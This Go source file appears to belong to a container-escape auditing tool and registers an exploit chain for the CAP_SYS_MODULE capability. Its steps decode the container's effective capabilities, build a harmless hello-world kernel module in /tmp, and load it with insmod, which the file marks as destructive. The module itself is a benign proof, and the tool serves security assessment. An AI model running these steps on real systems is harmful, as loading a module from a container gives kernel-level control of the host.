package chains

import (
	"github.com/tristanvaquero/escape/pkg/check"
	"github.com/tristanvaquero/escape/pkg/exploit"
)

// sysModuleLoad — CAP_SYS_MODULE lets the workload load arbitrary
// kernel modules. There is no further escape needed: a kernel module
// IS the host kernel.
type sysModuleLoad struct{ exploit.Base }

func (c *sysModuleLoad) Matches(results []check.Result) *exploit.Match {
	if !exploit.EvidenceContains(results, "container.capabilities.dangerous", "CAP_SYS_MODULE") {
		return nil
	}
	return &exploit.Match{
		ChainID:    c.ID(),
		Required:   []string{"container.capabilities.dangerous"},
		Confidence: "high",
	}
}

func (c *sysModuleLoad) Steps(_ *exploit.Match) []exploit.Step {
	return []exploit.Step{
		{
			Title:   "Confirm the capability is effective",
			Command: `grep CapEff /proc/self/status; capsh --decode=$(grep CapEff /proc/self/status | awk '{print $2}')`,
			Note:    "If CAP_SYS_MODULE appears, you're good.",
		},
		{
			Title: "Build a minimal hello-world LKM (proof, not weapon)",
			Command: `cat > /tmp/escape.c <<'EOF'
#include <linux/module.h>
#include <linux/kernel.h>
static int __init m_init(void){ printk(KERN_ALERT "escape: hello from kernel\n"); return 0; }
static void __exit m_exit(void){ printk(KERN_ALERT "escape: goodbye\n"); }
module_init(m_init); module_exit(m_exit);
MODULE_LICENSE("GPL");
EOF
echo "obj-m += escape.o" > /tmp/Makefile
cd /tmp && make -C /lib/modules/$(uname -r)/build M=/tmp modules`,
			Note: "Requires kernel headers in the container. The PoC stops at *building*; loading is the destructive step below.",
		},
		{
			Title:   "Load the module (DESTRUCTIVE — skip in audit-only runs)",
			Command: `insmod /tmp/escape.ko; dmesg | tail -3`,
			Note:    "After loading, your code runs in ring 0. Don't do this on production hosts.",
		},
	}
}

func init() {
	exploit.Register(&sysModuleLoad{Base: exploit.Base{
		IDValue:       "chain.sys_module_load",
		NameValue:     "CAP_SYS_MODULE → kernel-mode RCE",
		GoalValue:     "Load an arbitrary kernel module from inside the workload.",
		RiskValue:     exploit.RiskDestructive,
		SeverityValue: check.SeverityCritical,
		ReferencesValue: []string{
			"https://man7.org/linux/man-pages/man8/insmod.8.html",
		},
		AttackValue: []string{"T1611"},
	}})
}
